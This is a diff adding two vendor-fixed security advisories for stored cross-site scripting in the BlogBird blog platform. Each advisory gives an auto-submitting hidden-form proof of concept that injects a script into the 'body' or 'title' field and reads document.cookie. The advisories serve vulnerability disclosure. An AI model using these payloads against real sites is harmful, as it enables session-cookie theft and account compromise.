@@ -1,0 +1,70 @@
+Vulnerability ID: HTB22647
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_blogbird_1.html
+Product: BlogBird
+Vendor: BlogBird ( http://www.blogbird.nl/ ) 
+Vulnerable Version: Current actual version on http://www.blogbird.nl/
+Vendor Notification: 13 October 2010 
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Status: Fixed by Vendor
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the blog elements saving script to properly sanitize user-supplied input in "body" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://site/elements/save/2648" method="post" name="main">
+<input type="hidden" name="files_id" value="123">
+<input type="hidden" name="type" value="posts">
+<input type="hidden" name="column" value="col1">
+<input type="hidden" name="title" value="post title">
+<input type="hidden" name="element" value="post">
+<input type="hidden" name="body" value='post text"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="extended" value="">
+<input type="hidden" name="publish" value="1">
+<input type="hidden" name="page" value="home">
+<input type="hidden" name="author" value="author">
+<input type="hidden" name="tags" value="">
+</form>
+<script>
+document.main.submit();
+</script>
+
+Solution: Upgrade to the most recent version
+
+-----------------------------------------------------------------------------------------------------------------
+
+Vulnerability ID: HTB22646
+Reference: http://site/advisory/xss_vulnerability_in_blogbird.html
+Product: BlogBird
+Vendor: BlogBird ( http://www.blogbird.nl/ )
+Vulnerable Version: Current actual version on http://www.blogbird.nl/
+Vendor Notification: 13 October 2010
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Status: Fixed by Vendor
+Risk level: Medium
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the blog setting save script to properly sanitize user-supplied input in "title" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://www.blogbird.nl/settings/save" method="post" name="main">
+<input type="hidden" name="title" value='My Blog Title"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="description" value="">
+<input type="hidden" name="keywords" value="">
+<input type="hidden" name="language" value="dutch">
+<input type="hidden" name="date_format" value="">
+<input type="hidden" name="per_page" value="0">
+</form>
+<script>
+document.main.submit();
+</script>
+
+Solution: Upgrade to the most recent version
